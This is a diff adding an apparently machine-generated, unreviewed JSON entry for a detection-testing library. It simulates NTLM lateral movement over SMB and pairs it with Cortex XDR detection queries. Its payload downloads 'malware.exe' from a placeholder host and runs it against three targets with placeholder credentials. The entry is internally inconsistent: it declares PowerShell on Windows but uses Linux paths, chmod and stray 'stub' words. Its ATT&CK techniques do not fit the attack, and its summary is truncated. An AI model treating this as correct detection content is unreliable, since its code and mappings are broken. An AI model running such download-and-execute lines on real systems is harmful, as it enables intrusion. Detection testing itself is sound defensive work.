@@ -1,0 +1,193 @@
+{
+  "id": "TTP-0000-0153",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-windows",
+      "endpoint",
+      "cortex-analytics-alert"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "windows"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Rare NTLM Usage by User - Lateral Movement via SMB",
+    "summary": "An attacker uses NTLM authentication to move laterally across the network via SMB connections, triggering the Rare NTLM Usage by User alert. Cortex should detect the unusual NTLM authentication patter",
+    "description": "An attacker uses NTLM authentication to move laterally across the network via SMB connections, triggering the Rare NTLM Usage by User alert. Cortex should detect the unusual NTLM authentication patterns and related process behaviors."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1046",
+        "name": "Network Service Discovery",
+        "tactic_ids": [
+          "TA0007"
+        ],
+        "tactic_names": [
+          "Discovery"
+        ]
+      },
+      {
+        "technique_id": "T1071",
+        "name": "Application Layer Protocol",
+        "tactic_ids": [
+          "TA0011"
+        ],
+        "tactic_names": [
+          "Command and Control"
+        ]
+      },
+      {
+        "technique_id": "T1566",
+        "name": "Phishing",
+        "tactic_ids": [
+          "TA0001"
+        ],
+        "tactic_names": [
+          "Initial Access"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "windows",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "administrator",
+    "payload": {
+      "interpreter": "powershell",
+      "code": "wget http://192.0.2.50/malware.exe -O /tmp/ntlm_smb.exe\nstub chmod +x /tmp/ntlm_smb.exe\nstub /tmp/ntlm_smb.exe -t 192.0.2.100 -u user -p password\nstub /tmp/ntlm_smb.exe -t 192.0.2.101 -u user -p password\nstub /tmp/ntlm_smb.exe -t 192.0.2.102 -u user -p password",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "NTLM authentication process",
+        "expected_value": "action_process_image_name = 'ntlm_smb.exe'"
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "SMB connection to target",
+        "expected_value": "dst_ip = '192.0.2.100' and dst_port = 445"
+      },
+      {
+        "artifact_type": "file",
+        "description": "Malware binary",
+        "expected_value": "action_file_path = '/tmp/ntlm_smb.exe'"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "Rare NTLM Usage by User",
+        "description": "Detection of NTLM authentication attempts by a user outside of normal behavior patterns",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name = 'ntlm_smb.exe'\n| filter action_remote_ip in ('192.0.2.100', '192.0.2.101', '192.0.2.102')",
+        "mitre_technique_ids": [
+          "T1046",
+          "T1071",
+          "T1566"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "Unusual SMB Authentication Pattern",
+        "description": "Detection of NTLM authentication attempts from user account to multiple targets in short time window",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.NETWORK_CONNECTION\n| filter action_remote_ip in ('192.0.2.100', '192.0.2.101', '192.0.2.102')\n| filter dst_port = 445\n| filter actor_process_image_name = 'ntlm_smb.exe'",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "process_start",
+        "mitre_technique_ids": [
+          "T1046",
+          "T1071",
+          "T1566"
+        ],
+        "severity": "high"
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "NTLM Authentication Hunt",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.NETWORK_CONNECTION\n| filter dst_port = 445\n| filter action_remote_ip in ('192.0.2.100', '192.0.2.101', '192.0.2.102')\n| filter actor_process_image_name = 'ntlm_smb.exe'\n| comp count() by actor_process_image_name, action_remote_ip",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) — Rare NTLM Usage by User; Required Data: XDR Agent. Ref: https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/rare-ntlm-usage-by-user"
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Cortex XDR Analytics Alert Reference: Rare NTLM Usage by User",
+      "url": "https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/rare-ntlm-usage-by-user",
+      "publisher": "Palo Alto Networks",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1046",
+      "url": "https://attack.mitre.org/techniques/T1046/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1071",
+      "url": "https://attack.mitre.org/techniques/T1071/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1566",
+      "url": "https://attack.mitre.org/techniques/T1566/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
